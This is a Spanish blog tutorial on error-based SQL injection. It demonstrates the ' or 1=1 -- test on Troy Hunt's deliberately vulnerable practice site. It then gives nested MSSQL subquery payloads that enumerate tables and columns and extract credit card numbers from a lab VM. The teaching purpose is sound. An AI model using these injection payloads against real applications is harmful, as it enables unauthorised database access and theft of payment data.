---
layout: post
title: Ataque SQL Injection por error
category: Hacking
comments: true
description: Es el más comun y el más facil de explotar ya que es la propia aplicacion que nos va diciendo los errores que da la base de datos cuando vamos usando los ataques de sql injection. Con este error es muy facil conseguir cualquier cosa de la base de datos (estructura, tablas, nombres de campos e incluso datos).
tags:
    - injection
    - owasp
---

Es el más comun y el más facil de explotar ya que es la propia aplicacion que nos va diciendo los errores que da la base de datos cuando vamos usando los ataques de sql injection. Con este error es muy facil conseguir cualquier cosa de la base de datos (estructura, tablas, nombres de campos e incluso datos).


<figure>
<img alt="que es sql injection" src="/resources/images/que-es-sql-injection/sql-injection.png"/>
<figcaption>
SQL Injection, la vulnerabilidad web más peligrosa según OWASP. 
</figcaption>
</figure>


## Para practicar

Te recomiendo que uses esta pagina web: [hackyourselffirst.troyhunt.com](http://hackyourselffirst.troyhunt.com){:target="_blank"}. Es una pagina vulnerable hecho a posta para poder probar todas las vulnerabilidades web de Owasp, esta creada por el hacker etico [Troy Hunt](https://www.troyhunt.com/){:target="_blank"}. 
Tiene varios cursos de hacking en [Pluralsight](https://app.pluralsight.com/library/){:target="_blank"} te recomiendo que te subscribas a Pluralsight y los hagas.

## Como encontrar encontrar esta vulnerabilidad

En la pagina de hackyourselffirst.troyhunt.com en la pagina de buscar cilindros, y seleccionamos los coches que tienen 8 cilindros, logicamente solo nos saldran los coches con 8 cilindros.

<div class="info alert">
http://hackyourselffirst.troyhunt.com/CarsByCylinders?Cylinders=V8
</div>

Para ver si esta pagina es vulnerable a un ataque sql inject, solo haria falta añadir detras esto: ' or 1=1 --

<div class="info alert">
http://hackyourselffirst.troyhunt.com/CarsByCylinders?Cylinders=V8' or 1=1 --
</div>

y Tachan!! nos aparecen todos los coches,la pagina es vulnerable al ataque sql injection.


## Y que significa *' or 1=1 --*

Estos caracteres que hemos añadido detras tienen su signficado, os lo voy a explicar.

*'* sin esta comilla, lo que haria la web seria buscar todos los coches con '8 or 1=1--' cilindros, al añadirla hemos cerrado lo que esta buscando la aplicacion. La comilla es necesaria cuando la busqueda original es tipo string, como es V8 si fuera un valor numerico, por ejemplo un 8, no haria falta ya que los valores numericos en la query original van sin comillas.

<div class="env-header">SQL CON STRING</div>
{% highlight sql linenos %}

Select id, nombre from coches where marca = 'ferrari' 

{% endhighlight %}

<div class="env-header">SQL CON VALOR NUMERICO</div>
{% highlight sql linenos %}

Select id, nombre from coches where year = 2012 

{% endhighlight %}

*or 1=1* esta funcion logica lo que nos ayuda es que da igual lo que buscase la aplicacion, si era falso o no, ahora sera siempre verdadero, ya que 1=1 es siempre verdadero.

*---* esto en sql es para escribir comentarios, si despues de nuestra injeccion de sql quedase algo en la query de sql, por ejemplo un order by o algo más en la busqueda, daria igual ya que para el servidor sql seria como un comentario y no le haria caso.


## El ataque SQL Injection por error


Tengo una pagina web vulnerable a sql injection en una maquina virtual de mi ordenador, asi que lo primero que hago es probar que la pagina en question es vulnerable a un sql injection.

<figure>
<img alt="web vulnerable a sql injection" class="img img-responsive" src="/resources/images/injection-error/injection-sql-error-1.png"/>
<figcaption>
SQL Injection, la vulnerabilidad web más peligrosa según OWASP. 
</figcaption>
</figure>

<figure>
<img alt="web vulnerable a sql injection" class="img img-responsive" src="/resources/images/injection-error/injection-sql-error-2.png"/>
<figcaption>
Esta web si es vulnerable a sql injection. 
</figcaption>
</figure>

Al ser vulnerable a sql injection, explotamos la vulnerabilidad empezando a sacar todos los nombres de las tablas de la base de datos.

<div class="env-header">SQL Enumeradora 1</div>
{% highlight sql linenos %}

(
    select name from sysobjects where id=
    (
        select top 1 id from
        (
            select top 1 id from sysobjects where xtype=char(85) order by id asc
        ) sq order by id desc
    )
)

{% endhighlight %}


Esta sentencia SQL, son tres sentencias sql anidadas, hacen lo siguiente:

*select top 3 id from sysobjects where xtype=char(85) order by id asc*  selectiona los tres primeros ids que sean tipo tabla de la tabla del systema sysobjects y los ordena por id ascendentemente.

*select top 1 id from ( ) sq order by id desc* selecciona el ultimo de la cola

*select name from sysobjects where id=* da el nombre de la tabla de ese id.

Es decir, podemos recorrer toda la lista de tablas de la base de datos cambiando el valor numerico del Top, ya que ira aumentando la cola, y nosotros siempre cogeremos el ultimo de la cola.

En esta query tanto podemos usar la tabla sysobjects o sys.tables.


<div class="env-header">SQL Enumeradora 2 </div>
{% highlight sql linenos %}

(
    select name from sys.tables where object_id=
    (
        select top 1 object_id from
        (
            select top 1 object_id from sys.tables order by object_id asc
        ) sq order by object_id desc
    )
)

{% endhighlight %}



<figure>
<img alt="web vulnerable a sql injection" class="img img-responsive" src="/resources/images/injection-error/injection-sql-error-3.png"/>
<figcaption>
Extrayendo el nombre de las tablas de la base de datos mediante sql injection. 
</figcaption>
</figure>

<div class="env-header">Aumentamos el valor del top... y otra tabla</div>
{% highlight sql linenos %}

(
    select name from sysobjects where id=
    (
        select top 1 id from
        (
            select top 3 id from sysobjects where xtype=char(85) order by id asc
        ) sq order by id desc
    )
)

{% endhighlight %}

<figure>
<img alt="web vulnerable a sql injection" class="img img-responsive" src="/resources/images/injection-error/injection-sql-error-4.png"/>
<figcaption>
Extrayendo el nombre de las tablas de la base de datos mediante sql injection. Otra tabla más..
</figcaption>
</figure>


Y ahora que tenemos los nombres de las tablas, ahora a por las columnas. En la base de datos hay una tabla llamada CreditCard, o sea tarjetas de credito, y el campo 3 de la tabla se llama... CardNumber!!

__Error de conversión al convertir el valor nvarchar 'CardNumber' al tipo de datos int.__


<div class="env-header">Aumentamos el id del column_id y sacamos las columnas de la tabla.</div>
{% highlight sql linenos %}

(
    select name from sys.columns where column_id = 1 and  object_id=
    (
        select top 1 id from
        (
            select top 3 id from sysobjects where xtype=char(85) order by id asc
        ) sq order by id desc
    )
)

{% endhighlight %}

Ya tenemos la tabla, el campo de la tabla, ahora los valores... y como hasta ahora, cambiando el valor top de la subconsulta tendremos un registro nuevo


<div class="env-header">Y como hasta ahora, aumentamos el el top de la consulta anidada y tenemos más valores....</div>
{% highlight sql linenos %}

(
    select CardNumber from CreditCard where  CreditCardID=
    (
        select top 1 CreditCardID from
        (
            select top 3 CreditCardID from CreditCard order by CreditCardID asc
        ) sq order by CreditCardID desc
    )
)

{% endhighlight %}

<figure>
<img alt="web vulnerable a sql injection" class="img img-responsive" src="/resources/images/injection-error/injection-sql-error-5.png"/>
<figcaption>
Y ahora a sacar todos los numeros de las tarjetas de credito....
</figcaption>
</figure>















